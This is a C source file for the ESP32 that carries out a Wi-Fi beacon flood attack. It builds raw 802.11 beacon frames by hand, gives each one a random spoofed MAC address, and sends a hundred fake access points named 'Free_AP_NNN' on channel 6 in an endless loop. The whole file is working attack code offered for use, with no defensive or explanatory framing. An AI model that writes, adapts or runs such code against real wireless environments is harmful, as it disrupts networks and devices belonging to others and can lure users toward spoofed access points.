#include "beacon_flood.h"
#include <stdlib.h>
#include <string.h>

#define TAG "BEACON_FLOOD"
#define CHANNEL 6
#define NUM_SSIDS 100

static const uint8_t beacon_template[] = {
    // 802.11 MAC Header (24 bytes)
    0x80, 0x00,                         // Frame Control (Type: Management, Subtype: Beacon)
    0x00, 0x00,                         // Flags
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (will be set dynamically)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (will be set dynamically)
    0x00, 0x00,                         // Sequence Control
    
    // Fixed Parameters (12 bytes)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp (8 bytes)
    0x64, 0x00,                         // Beacon Interval (100 TU = ~102.4ms)
    0x11, 0x04                          // Capability Info (ESS + Privacy)
};


// init wifi config for beacon SSID flood attack
void init_beacon_wifi() {
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_start());

    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
    
    ESP_LOGI(TAG, "WiFi initialized in NULL mode for beacon flooding");
}


static void send_beacon(const char *ssid, uint8_t ssid_len, uint8_t *mac) {
    if (ssid_len > 32) {
        ESP_LOGW(TAG, "SSID length too long (%d), truncating to 32", ssid_len);
        ssid_len = 32;
    }

    // Calculate frame size properly
    size_t mac_header_len = 24;        // 802.11 MAC header
    size_t fixed_params_len = 12;      // Timestamp + Beacon Interval + Capability
    size_t ssid_element_len = 2 + ssid_len;  // Tag (1) + Length (1) + SSID
    size_t rates_element_len = 10;     // Tag (1) + Length (1) + 8 rates
    size_t ds_param_len = 3;           // Tag (1) + Length (1) + Channel (1)
    size_t tim_element_len = 6;        // Basic TIM element
    
    size_t total_len = mac_header_len + fixed_params_len + ssid_element_len + 
                      rates_element_len + ds_param_len + tim_element_len;

    uint8_t *frame = malloc(total_len);
    if (!frame) {
        ESP_LOGE(TAG, "Failed to allocate memory for beacon frame");
        return;
    }

    // Clear the frame
    memset(frame, 0, total_len);

    // 1. Copy MAC header and fixed parameters
    memcpy(frame, beacon_template, mac_header_len + fixed_params_len);

    // 2. Set MAC addresses (source and BSSID)
    memcpy(&frame[10], mac, 6);  // Source address
    memcpy(&frame[16], mac, 6);  // BSSID

    // 3. Set timestamp (current time in microseconds)
    uint64_t timestamp = esp_timer_get_time();
    memcpy(&frame[24], &timestamp, 8);

    size_t offset = mac_header_len + fixed_params_len;

    // 4. SSID Information Element
    frame[offset++] = 0x00;        // SSID Element ID
    frame[offset++] = ssid_len;    // Length
    memcpy(&frame[offset], ssid, ssid_len);
    offset += ssid_len;

    // 5. Supported Rates Information Element
    frame[offset++] = 0x01;        // Supported Rates Element ID
    frame[offset++] = 0x08;        // Length
    // Basic rates (marked with 0x80) and extended rates
    frame[offset++] = 0x82;        // 1 Mbps (basic)
    frame[offset++] = 0x84;        // 2 Mbps (basic)
    frame[offset++] = 0x8b;        // 5.5 Mbps (basic)
    frame[offset++] = 0x96;        // 11 Mbps (basic)
    frame[offset++] = 0x24;        // 18 Mbps
    frame[offset++] = 0x30;        // 24 Mbps
    frame[offset++] = 0x48;        // 36 Mbps
    frame[offset++] = 0x6c;        // 54 Mbps

    // 6. DS Parameter Set Information Element
    frame[offset++] = 0x03;        // DS Parameter Element ID
    frame[offset++] = 0x01;        // Length
    frame[offset++] = CHANNEL;     // Current Channel

    // 7. TIM (Traffic Indication Map) Information Element
    frame[offset++] = 0x05;        // TIM Element ID
    frame[offset++] = 0x04;        // Length
    frame[offset++] = 0x00;        // DTIM Count
    frame[offset++] = 0x01;        // DTIM Period
    frame[offset++] = 0x00;        // Bitmap Control
    frame[offset++] = 0x00;        // Partial Virtual Bitmap

    ESP_LOGI(TAG, "Sending beacon: SSID='%.*s' (len %d), MAC=%02x:%02x:%02x:%02x:%02x:%02x, frame_len=%zu",
             ssid_len, ssid, ssid_len,
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],
             total_len);

    // Send the frame
    esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_STA, frame, total_len, false);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "esp_wifi_80211_tx failed with error 0x%x (%s)", ret, esp_err_to_name(ret));
    }

    free(frame);
}

void fill_random_bytes(uint8_t *buf, size_t len) {
    size_t i = 0;
    while (i < len) {
        uint32_t rnd = esp_random();
        for (int j = 0; j < 4 && i < len; j++, i++) {
            buf[i] = (rnd >> (j * 8)) & 0xFF;
        }
    }
}

static void beacon_task(void *pvParam) {
    uint8_t mac[6];
    char ssid[33]; 
    
    // Set the channel
    esp_err_t ret = esp_wifi_set_channel(CHANNEL, WIFI_SECOND_CHAN_NONE);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Failed to set channel: %s", esp_err_to_name(ret));
        vTaskDelete(NULL);
        return;
    }

    ESP_LOGI(TAG, "Beacon flood task started on channel %d", CHANNEL);

    while (1) {
        for (int i = 0; i < NUM_SSIDS; i++) {

            // generate random ssid
            snprintf(ssid, sizeof(ssid), "Free_AP_%03d", i);

            // Generate random MAC address
            fill_random_bytes(mac, 6);
            // Set locally administered bit and clear multicast bit
            mac[0] = (mac[0] & 0xFE) | 0x02;
            
            send_beacon(ssid, strlen(ssid), mac);
            
            // Small delay between beacons
            vTaskDelay(pdMS_TO_TICKS(10));
        }
        
        // Longer delay between rounds
        vTaskDelay(pdMS_TO_TICKS(40));
    }
}

void start_beacon_flood() {
    ESP_LOGI(TAG, "Launching beacon flood task...");
    init_beacon_wifi();
    BaseType_t result = xTaskCreate(beacon_task, "beacon_flood_task", 4096, NULL, 5, NULL);
    if (result != pdPASS) {
        ESP_LOGE(TAG, "Failed to create beacon flood task");
    }
}